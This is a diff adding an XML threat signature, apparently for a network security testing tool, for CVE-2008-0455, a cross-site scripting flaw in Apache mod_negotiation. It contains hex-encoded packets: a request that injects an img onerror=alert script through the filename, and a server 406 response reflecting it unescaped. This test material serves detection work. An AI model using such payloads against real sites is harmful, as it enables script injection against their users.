@@ -1,0 +1,93 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Apache HTTP Server mod_negotiation Filename Handling Cross Site Scripting"/>
+    <EngDesc display="true" value="There exist a cross-site scripting vulnerability in Apache mod_negotiation Module. The flaw is due to lack of validation of the user supplied input data. The flaw may be exploited by malicious users to execute arbitrary HTML code on target user's web browser, within the context of a trusted web site."/>
+    <Intent display="true">
+      <item value="DESIGN_WEAKNESS"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Apache"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Apache_HTTPD"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Apache_HTTPD_1.3.39"/>
+      <item value="Apache_HTTPD_2.0.61"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20080122-22"/>
+    <CVEID display="true" value="CVE-2008-0455"/>
+    <bugtraqID display="true" value="27409"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="99311f6d209c7c6cb85334f509b1ef3f"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="not-requred"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="633370991472320000"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1201521281" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="H"/>
+  </Variables>
+  <Loops>
+    <for index="E">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="F">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="E" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F3C696D672532307372633D73612532306F6E6572726F723D616C657274282748656C6C6F27293E20485454502F312E310D0A486F73743A203137322E31362E382E3231350D0A4163636570743A20696D6167652F6A7065673B20713D300D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="F" Count="">
+      <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+          <TCP srcPort="@random(1026,65535)" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502F312E3120343036204E6F742041636365707461626C650D0A446174653A205468752C203234204A616E20323030382032303A34383A323120474D540D0A5365727665723A204170616368652F322E322E362028556E6978290D0A416C7465726E617465733A207B223C696D67207372633D7361206F6E6572726F723D616C657274282748656C6C6F27293E2E6A7067222031207B7479706520696D6167652F6A7065677D207B6C656E67746820347D7D0D0A566172793A206E65676F74696174650D0A54434E3A206C6973740D0A436F6E74656E742D4C656E6774683A203434340D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D69736F2D383835392D310D0A0D0A3C21444F43545950452048544D4C205055424C494320222D2F2F494554462F2F4454442048544D4C20322E302F2F454E223E0A3C68746D6C3E3C686561643E0A3C7469746C653E343036204E6F742041636365707461626C653C2F7469746C653E0A3C2F686561643E3C626F64793E0A3C68313E4E6F742041636365707461626C653C2F68313E0A3C703E416E20617070726F70726961746520726570726573656E746174696F6E206F662074686520726571756573746564207265736F75726365202F266C743B696D67207372633D7361206F6E6572726F723D616C657274282748656C6C6F27292667743B20636F756C64206E6F7420626520666F756E64206F6E2074686973207365727665722E3C2F703E0A417661696C61626C652076617269616E74733A0A3C756C3E0A3C6C693E3C6120687265663D223C696D67207372633D7361206F6E6572726F723D616C657274282748656C6C6F27293E2E6A7067223E3C696D67207372633D7361206F6E6572726F723D616C657274282748656C6C6F27293E2E6A70673C2F613E202C207479706520696D6167652F6A7065673C2F6C693E0A3C2F756C3E0A3C2F626F64793E3C2F68746D6C3E0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
